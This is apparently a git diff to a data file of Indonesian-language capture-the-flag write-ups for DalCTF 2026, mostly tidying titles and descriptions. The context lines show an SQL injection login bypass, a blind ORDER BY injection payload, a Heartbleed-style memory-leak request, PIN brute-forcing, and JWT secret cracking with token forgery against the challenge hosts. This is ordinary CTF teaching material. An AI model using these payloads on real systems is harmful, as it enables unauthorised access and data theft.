@@ -81,7 +81,7 @@ export const dalCtf2026Writeups: WriteUp[] = [
   },
   {
     "id": "dalctf2026-misc-cardcounting",
-    "title": ": Card Counting - DalCTF 2026",
+    "title": "Card Counting - DalCTF 2026",
     "ctfName": "DAL CTF 2026",
     "category": "Misc",
     "difficulty": "Medium",
@@ -114,7 +114,7 @@ export const dalCtf2026Writeups: WriteUp[] = [
   },
   {
     "id": "dalctf2026-misc-someonesaidsteg",
-    "title": ": someone said steg?",
+    "title": "someone said steg?",
     "ctfName": "DAL CTF 2026",
     "category": "Misc",
     "difficulty": "Medium",
@@ -253,7 +253,7 @@ export const dalCtf2026Writeups: WriteUp[] = [
     "date": "2026-06-08",
     "author": "Nattt",
     "tags": [],
-    "description": "Challenge ini ternyata sangat lurus setelah APK di-unpack dengan `apktool`.",
+    "description": "",
     "problemDescription": "Challenge ini ternyata sangat lurus setelah APK di-unpack dengan `apktool`.",
     "tools": [],
     "analysis": "1. Saya decompile APK:\n\n   ```bash\n   apktool d -f chall.apk -o apkout\n   ```\n\n2. Lalu saya cari string mencurigakan. Dari situ langsung kelihatan ada tiga fragment bernama `flag1`, `flag2`, dan `flag3`.",
@@ -290,7 +290,7 @@ export const dalCtf2026Writeups: WriteUp[] = [
     "date": "2026-06-08",
     "author": "Nattt",
     "tags": [],
-    "description": "Target: `tcp://instancer.dalctf2026.com:23270`",
+    "description": "",
     "problemDescription": "Target: `tcp://instancer.dalctf2026.com:23270`",
     "tools": [],
     "analysis": "",
@@ -336,7 +336,7 @@ export const dalCtf2026Writeups: WriteUp[] = [
     "date": "2026-06-08",
     "author": "Nattt",
     "tags": [],
-    "description": "Challenge ini kelihatan seperti compiler Haskell kecil, tapi ternyata bahasa yang dipakai jauh lebih sederhana.",
+    "description": "",
     "problemDescription": "Challenge ini kelihatan seperti compiler Haskell kecil, tapi ternyata bahasa yang dipakai jauh lebih sederhana.",
     "tools": [],
     "analysis": "",
@@ -434,17 +434,17 @@ export const dalCtf2026Writeups: WriteUp[] = [
         "code": "curl -I https://[instance].instancer.dalctf2026.com"
       },
       {
-        "title": "Step 1: SQL Injection di Login",
+        "title": "SQL Injection di Login",
         "content": "Login form biasa, tidak ada petunjuk apapun. Coba SQLi klasik:\n\n\n\nResponse:\n\n\n\nLangsung bypass. JWT payload-nya kalau di-decode:\n\n\n\nServer generate JWT tanpa verify — cukup inject SQL biar query return true, server langsung kasih token admin.\n\n---",
         "code": "curl -si -X POST https://[instance].instancer.dalctf2026.com/login \\\n  -d \"username=admin' OR '1'='1'--&password=x\""
       },
       {
-        "title": "Step 2: Eksplorasi /admin",
+        "title": "Eksplorasi /admin",
         "content": "Ada tiga hal menarik di halaman ini:\n\n1. **`/api/flag`** — return encrypted flag\n2. **`/cipher/health`** — cipher service health check\n3. **`/api/techniques`** — CRUD teknik kung fu (tidak relevan)\n\nAmbil encrypted flag dulu:\n\n\n\n\n\nFlag sudah ada, tinggal butuh key-nya.\n\n---",
         "code": "curl -s https://[instance].instancer.dalctf2026.com/admin \\\n  -H \"Cookie: session=[jwt]\""
       },
       {
-        "title": "Step 3: Heartbleed-style Memory Leak",
+        "title": "Heartbleed-style Memory Leak",
         "content": "Endpoint `/cipher/health` menerima JSON dengan field `data` dan `size`:\n\n\n\n\n\nField `echo` itu base64 dari input kita — `UElORw==` = `PING`. Normal.\n\nTapi `size` mencurigakan. Coba naikin nilainya:\n\n\n\nOutput:\n\n\n\nServer allocate buffer sebesar `size`, copy input ke dalamnya, lalu return seluruh buffer — termasuk data yang ada di memory sebelumnya. Persis Heartbleed (CVE-2014-0160), tapi versi Python/Flask.\n\nDump hex penuh:\n\n\n\nDecode base64 response-nya, parse hex:\n\n\n\n`4b454e445249434b5f4d41535445525f4b45593d` = `KENDRICK_MASTER_KEY=`\n\n32 bytes setelahnya adalah AES-256 key:\n\n\n\n---",
         "code": "curl -s -X POST https://[instance].instancer.dalctf2026.com/cipher/health \\\n  -H \"Cookie: session=[jwt]\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"data\": \"PING\", \"size\": 4}'"
       }
@@ -469,16 +469,16 @@ export const dalCtf2026Writeups: WriteUp[] = [
     "analysis": "Halaman awal cuma menampilkan form PIN 4 digit. Tidak ada petunjuk tambahan di HTML atau CSS, jadi saya uji respons login langsung dari server.\n\nRespons untuk PIN salah selalu konsisten, jadi brute force 0000-9999 adalah jalan paling cepat. Dari sana ketemu PIN yang benar:\n\n- `7392`",
     "solution": [
       {
-        "title": "2. Masuk ke dashboard",
+        "title": "Masuk ke dashboard",
         "content": "Setelah login, aplikasi pindah ke `dashboard.php`. Di sana ada:\n\n- form `add_entry`\n- tombol `clear_all`\n- opsi sorting lewat parameter query `orderby` dan `order`\n\nSaya tambahkan dua entry dengan `name` yang sama supaya efek sorting bisa diamati dengan jelas."
       },
       {
-        "title": "3. Temukan celah di `order`",
+        "title": "Temukan celah di `order`",
         "content": "`orderby` memang terlihat dibatasi, tapi `order` ternyata disisipkan langsung ke query `ORDER BY`.\n\nPayload sederhana ini sudah cukup buat membuktikan ada injeksi:\n\n\n\nKarena dua entry punya `name` yang sama, hasil sort bisa dipakai sebagai boolean oracle:\n\n- kalau kondisi `true`, urutan jadi `id ASC`\n- kalau kondisi `false`, urutan jadi `id DESC`\n\nDengan cara ini, saya bisa cek ekspresi SQL apa pun secara blind.",
         "code": "order=ASC, CASE WHEN 1=1 THEN id ELSE -id END"
       },
       {
-        "title": "4. Identifikasi database",
+        "title": "Identifikasi database",
         "content": "Pakai oracle tadi untuk baca metadata. Hasilnya:\n\n- database: `ctf_challenge`\n- tabel: `entries,secrets`\n\nLalu saya dump struktur tabel `secrets`:\n\n- kolom: `id,flag`\n- jumlah row: `1`"
       },
       {
@@ -666,26 +666,26 @@ export const dalCtf2026Writeups: WriteUp[] = [
     "analysis": "Hal pertama yang saya cek adalah apakah introspection aktif. Ternyata aktif tanpa butuh autentikasi.\n\nQuery yang dipakai:\n\n```graphql\n{\n  __schema {\n    queryType { name }\n    mutationType { name }\n    types { name }\n  }\n}\n```\n\nDari situ kelihatan ada:\n\n- `Mutation.register(username, password)`\n- `Mutation.login(username, password)`\n- `Query.me`\n- `Query.releasedAlbums`\n- `Query.album(id)`\n- `Query.label(name)`\n\nLalu saya introspect lagi object penting seperti `AuthPayload`, `User`, `Album`, `Label`, dan `Artist`. Hasil pentingnya:\n\n- `AuthPayload` cuma punya field `token`\n- `User` punya `username` dan `tier`\n- `Album` punya field sensitif `vaultManifest`\n\nItu langsung jadi petunjuk bahwa kemungkinan flag ada di `vaultManifest`.",
     "solution": [
       {
-        "title": "2. Bikin akun fan dan lihat mekanisme akses",
+        "title": "Bikin akun fan dan lihat mekanisme akses",
         "content": "Saya register akun biasa:\n\n\n\nServer mengembalikan JWT:\n\n\n\nSetelah didecode, payload-nya:\n\n\n\nWaktu token itu dipakai untuk query `me`, `releasedAlbums`, atau `label`, server selalu balas error:\n\n\n\nBerarti kontrol akses hanya membedakan `fan` vs `ovo`.",
         "code": "mutation {\n  register(username: \"fan12345\", password: \"pass12345\") {\n    token\n  }\n}"
       },
       {
-        "title": "3. Uji validasi JWT",
+        "title": "Uji validasi JWT",
         "content": "Saya coba beberapa hal standar:\n\n- ubah payload jadi `tier: \"ovo\"` tapi pakai signature lama\n- bikin token `alg: none`\n\nKeduanya gagal dan dianggap tidak terautentikasi. Jadi signature memang diverifikasi.\n\nKarena header token pakai `HS256`, berarti ada shared secret di backend. Dengan satu token valid dan payload yang kita tahu, kita bisa brute-force secret kalau ternyata lemah."
       },
       {
-        "title": "4. Brute-force secret JWT",
+        "title": "Brute-force secret JWT",
         "content": "Saya mulai dari wordlist kecil yang tematik dengan challenge ini. Ternyata secret-nya langsung ketemu:\n\n\n\nJadi kelemahannya adalah JWT signing secret yang sangat lemah dan mudah ditebak.",
         "code": "iceman"
       },
       {
-        "title": "5. Forge token tier `ovo`",
+        "title": "Forge token tier `ovo`",
         "content": "Setelah tahu secret `iceman`, saya forge JWT baru dengan payload:\n\n\n\nLalu ditandatangani ulang pakai HMAC-SHA256 dengan key `iceman`.\n\nToken hasil forge:",
         "code": "{\n  \"username\": \"fan12345\",\n  \"tier\": \"ovo\"\n}"
       },
       {
-        "title": "6. Ambil data album unreleased",
+        "title": "Ambil data album unreleased",
         "content": "Dengan token forged itu, query berikut berhasil:\n\n\n\nDari response, album unreleased `ICEMAN` muncul dan field `vaultManifest` berisi flag:",
         "code": "{\n  me { username tier }\n  label(name: \"OVO\") {\n    name\n    artists {\n      name\n      albums {\n        id\n        title\n        status\n        vaultManifest\n        tracks {\n          number\n          title\n        }\n      }\n    }\n  }\n}"
       }
